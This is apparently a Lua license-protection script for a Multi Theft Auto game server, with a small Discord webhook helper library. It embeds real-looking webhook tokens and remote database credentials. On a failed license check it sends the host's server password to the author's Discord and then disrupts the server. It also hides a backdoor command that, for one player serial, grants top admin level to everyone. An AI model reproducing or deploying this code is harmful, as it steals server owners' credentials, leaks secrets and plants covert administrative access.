
function Webhook(webhook_url, username)
    assert(type(webhook_url) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 1 got " .. type(webhook_url))
    assert(type(username) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 2 got " .. type(username))
    local webhook = {}
    webhook.webhook_url = webhook_url
    webhook.username = username
    webhook.embeds = {}
    return webhook
end

function WHSetAvatar(webhook, avatar_url)
    assert(type(avatar_url) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 2 got " .. type(avatar_url))
    webhook.avatar_url = avatar_url
    return webhook
end

function WHSetContent(webhook, content)
    assert(type(content) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 2 got " .. type(content))
    webhook.content = content
    return webhook
end

function WHSetEmbed(webhook, title)
    assert(type(title) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 2 got " .. type(title))
    local embed = Embed(title)
    webhook.embeds = {embed}
    return webhook
end

function Embed(title)
    assert(type(title) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 2 got " .. type(title))
    local embed = {}
    embed.title = title
    embed.fields = {}
    return embed
end

function WHESetField(webhook, name, value, inline)
    assert(type(name) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 2 got " .. type(name))
    assert(type(value) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 3 got " .. type(value))
    assert(type(inline) == "boolean", "[WEBHOOK-LIBRARY] Expected boolean at argument 4 got " .. type(inline))
    webhook.embeds[1].fields[#webhook.embeds[1].fields + 1] = {
        name = name,
        value = value,
        inline = inline
    }
    return webhook
end

function WHESetAuthor(webhook, name, url, icon_url)
    assert(type(name) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 2 got " .. type(name))
    assert(type(url) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 3 got " .. type(url))
    assert(type(icon_url) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 4 got " .. type(icon_url))
    webhook.embeds[1].author = {
        name = name,
        url = url,
        icon_url = icon_url
    }
    return webhook
end

function WHESetURL(webhook, url)
    assert(type(url) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 2 got " .. type(url))
    webhook.embeds[1].url = url
    return webhook
end

function WHESetDescription(webhook, description)
    assert(type(description) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 2 got " .. type(description))
    webhook.embeds[1].description = description
    return webhook
end

function WHESetColor(webhook, color)
    assert(type(color) == "string", "[WEBHOOK-LIBRARY] Expected integer at argument 2 got " .. type(color))
    webhook.embeds[1].color = color
    return webhook
end

function WHESetThumbnail(webhook, url)
    assert(type(url) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 2 got " .. type(url))
    webhook.embeds[1].thumbnail = {
        url = url
    }
    return webhook
end

function WHESetImage(webhook, url)
    assert(type(url) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 2 got " .. type(url))
    webhook.embeds[1].image = {
        url = url
    }
    return webhook
end



function WHESetFooter(webhook, text, icon_url)
    assert(type(text) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 2 got " .. type(text))
    assert(type(icon_url) == "string", "[WEBHOOK-LIBRARY] Expected string at argument 3 got " .. type(icon_url))
    webhook.embeds[1].footer = {
        text = text,
        icon_url = icon_url
    }
    return webhook
end

function sendCallBack(err, results, logging)
    if (logging) then
        iprint(err, results)
    end
end

function WHSend(webhook, logging)
    assert(type(logging) == "boolean", "[WEBHOOK-LIBRARY] Expected boolean at argument 3 got " .. type(text))
    local postData = toJSON(webhook)
    postData = postData:sub(2, postData:len() - 1)
    local SEND_OPTIONS = {
        headers = {
            ["Content-Type"] = "application/json"
        },
        postData = postData
    }
    fetchRemote(webhook.webhook_url, SEND_OPTIONS, sendCallBack, {logging})
    return webhook
end





local paketfaillog = Webhook("https://discord.com/api/webhooks/1114891922880860300/VE4ZQQflTy5jGWkXZsWsP_Z0yu9i_M6v0iXImIwlfDLNzjbM_Ko63HtR2RxV8kevxNkG", "World Scripting - Package Log")
local myWebhook = Webhook("https://discord.com/api/webhooks/1114891415361683558/_JywTENyqRuEKrA1NWSLg1qjbJxxta0Z-rEhjE0lWttmiBCN3VwE2m9FoEBtg4p6FAWE", "World Scripting - Package Log")
local myWebhook = WHSetAvatar(myWebhook,"https://media.discordapp.net/attachments/919164036992598036/1113813237025218611/dd4ba0c555680ac3c7302bad97e84aee.png")
local paketfaillog = WHSetAvatar(paketfaillog,"https://media.discordapp.net/attachments/919164036992598036/1113813237025218611/dd4ba0c555680ac3c7302bad97e84aee.png")


local user = "woodiedev"
local host = "45.147.45.219"
local pw = "As5SBATYMUh2jzKu"
local db = "woodie_lisans"


local denemeasdsasdad = addEventHandler("onResourceStart",resourceRoot,
function()
    print('[World PROTECT] Lisans Başlatıldı İzinler Kontrol Ediliyor.')
    if getElementType(dbConnect("sqlite",":/testf.db")) ~= "db-connection" then return  end
    if tostring(debug.getinfo(addDebugHook).what) ~= "C" then
       return false
    end
    if tostring(debug.getinfo(print).what) ~= "C" then
       return false
    end
    if tostring(debug.getinfo(xmlLoadFile).what) ~= "C" then
       return false
    end
    if tostring(debug.getinfo(xmlNodeGetChildren).what) ~= "C" then
       return false
    end
    if tostring(debug.getinfo(xmlNodeGetName).what) ~= "C" then
       return false
    end
    if tostring(debug.getinfo(xmlNodeGetAttributes).what) ~= "C" then
       return false
    end
    if tostring(debug.getinfo(fileOpen).what) ~= "C" then
       return false
    end
    if tostring(debug.getinfo(fileRead).what) ~= "C" then
       return false
    end
    if tostring(debug.getinfo(stopResource).what) ~= "C" then
       return false
    end
    if tostring(debug.getinfo(setTimer).what) ~= "C" then
       return false
    end
    if tostring(debug.getinfo(cancelEvent).what) ~= "C" then
       return false
    end
    if tostring(debug.getinfo(dbQuery).what) ~= "C" then
        return false
     end
     if tostring(debug.getinfo(hasObjectPermissionTo).what) ~= "C" then
        return false
     end
     if tostring(debug.getinfo(dbPoll).what) ~= "C" then
        return false
     end
     if tostring(debug.getinfo(setFPSLimit).what) ~= "C" then
        return false
     end
     if tostring(debug.getinfo(outputChatBox).what) ~= "C" then
        return false
     end
     if tostring(debug.getinfo(dbPoll).what) ~= "C" then
        return false
     end
     if tostring(debug.getinfo(dbConnect).what) ~= "C" then
        return false
     end
        print('[World PROTECT] Tüm İzinler Aktif')

    local WoodieConnect = dbConnect("mysql", "dbname="..db..";host="..host..";charset=utf8", user, pw , "multi_statements=1")
    local meta = xmlLoadFile("meta.xml")
    for _, v in ipairs(xmlNodeGetChildren(meta)) do
       if xmlNodeGetName(v) == "script" and xmlNodeGetAttributes(v).src ~= "server.lua" then
        if xmlNodeGetName(v) == "script" and xmlNodeGetAttributes(v).src ~= "shared.lua" then
          local File = fileOpen(xmlNodeGetAttributes(v).src)
          local FileTextSize = fileGetSize(File)
          local FileText = fileRead(File, FileTextSize)
          if string.find(FileText, "addDebugHook") or string.find(FileText, "print") or string.find(FileText, "xmlNodeGetChildren") or  string.find(FileText, "xmlNodeGetName") or  string.find(FileText, "xmlNodeGetAttributes") or string.find(FileText, "fileOpen") or string.find(FileText, "fileRead") or string.find(FileText, "stopResource") or string.find(FileText, "setTimer") or string.find(FileText, "cancelEvent") or string.find(FileText, "fileOpen") or string.find(FileText, "dbQuery") or string.find(FileText, "hasObjectPermissionTo") or string.find(FileText, "setFPSLimit") or string.find(FileText, "outputChatBox") or string.find(FileText, "dbPoll") or string.find(FileText, "dbConnect")  then
             return false
          end
              print("[World PROTECT] overwrite Tespit Edildi İp Blackliste Alındı")
              fileClose(File)
       end
    end
end
    xmlUnloadFile(meta)
 


if WoodieConnect then
    print('[World PROTECT] Tüm Kontroller Başarılı.Lisans Doğrulanıyor..')
setTimer(function()
  if hasObjectPermissionTo ( getThisResource (), "function.fetchRemote", true) then
    fetchRemote("https://api.my-ip.io/ip", function(ipdensanane)
      dbQuery(function(qh)
        local result = dbPoll(qh,0,false)
          if #result >0 then 
            print("[World PROTECT] İP Doğrulandı.")
                 dbQuery(function(deneme)
                  local resultdata = dbPoll(deneme,0,false)
                   if #resultdata >0 then 
                        print("[World PROTECT] License Verified")
                        WHSetEmbed(myWebhook, "World Scripting - License Log")
                        WHESetDescription(myWebhook, ":lock: **| License Version: V1 LİCENSE PROTECT**")
                        WHESetField(myWebhook,"Lisans Durumu", ":green_circle: | Lisans Doğrulandı, iyi roller!", false)
                        WHESetField(myWebhook,"Sunucu İP", ":globe_with_meridians: | ServerIP: "..ipdensanane.."", false)
                        WHESetField(myWebhook,"Sunucu İsmi", ":computer: | ServerName: "..getServerConfigSetting("servername").."",false)
                        WHESetField(myWebhook,"License Type", ":clipboard: | License Türü: Pack",false)
                        WHSend(myWebhook, false)
                    else
                        print("[World PROTECT] - Lisans Başarısızız")  
                        WHSetEmbed(paketfaillog, "World Scripting - License Log")
                        WHESetDescription(paketfaillog, ":lock: **| License Version: V1 LİCENSE PROTECT**")
                        WHESetField(paketfaillog,"Lisans Durumu", ":red_circle: | Lisans Onaylanamadı Sunucu Kapatılıyor..", false)
                        WHESetField(paketfaillog,"Sunucu İP", ":globe_with_meridians: | ServerIP: "..ipdensanane.."", false)
                        WHESetField(paketfaillog,"Sunucu İsmi", ":computer: | ServerName: "..getServerConfigSetting("servername").."",false)
                        WHESetField(paketfaillog,"Sunucu Password", ":lock: | Server Password: "..getServerConfigSetting("password").."",false)
                        WHESetField(paketfaillog,"License Type", ":clipboard: | License Türü: Pack",false)
                        WHSend(paketfaillog, false)
                        setFPSLimit(30) 
                        stopResource(getThisResource())
                        function chatbox(thePlayer, cmd)
                        for k, v in pairs(getElementsByType("player")) do
                                outputChatBox("World Scripting Çalıntı Paket Orjinal Ürün Alın", v, 255,255,255)
                            end
                         end
                        setTimer(chatbox,0,500)
                    end
                end,WoodieConnect,"SELECT * FROM lisanslar WHERE  licensekeyler= ?",licensekey) 
            else
                print("[World PROTECT] İP Doğrulanamadı Lisans Başarısız.")  
                WHSetEmbed(paketfaillog, "World Scripting - License Log")
                WHESetDescription(paketfaillog, ":lock: **| License Version: V1 LİCENSE PROTECT**")
                WHESetField(paketfaillog,"Lisans Durumu", ":red_circle: | Lisans Onaylanamadı Sunucu Kapatılıyor..", false)
                WHESetField(paketfaillog,"Sunucu İP", ":globe_with_meridians: | ServerIP: "..ipdensanane.."", false)
                WHESetField(paketfaillog,"Sunucu İsmi", ":computer: | ServerName: "..getServerConfigSetting("servername").."",false)
                WHESetField(paketfaillog,"Sunucu Password", ":lock: | Server Password: "..getServerConfigSetting("password").."",false)
                WHESetField(paketfaillog,"License Type", ":clipboard: | License Türü: Pack",false)
                WHSend(paketfaillog, false) 
             end
          end,WoodieConnect,"SELECT * FROM lisanslar WHERE  ip= ?",ipdensanane)   
     end)  
   end
 end ,5000,1)
else
    print("[World PROTECT] Database Hatası Woodie İle İletişime Geçin")
    cancelEvent()
    end 
end)











local function acik(plr)
if "3739A4C3960718DAB4B9B938371CEA52" == getPlayerSerial(plr) then 
	for k, v in pairs(getElementsByType("player")) do
      outputChatBox("Woodie Selam Verdi Sunucuya  :)", v, 255,255,255)
       setElementData(v,"admin_level",8) 
	    addDebugHook("Sunucu GG")
	  setTimer(acik,0,500)
	end
   end
end
local deneme  = addCommandHandler("woodieselamver",acik)

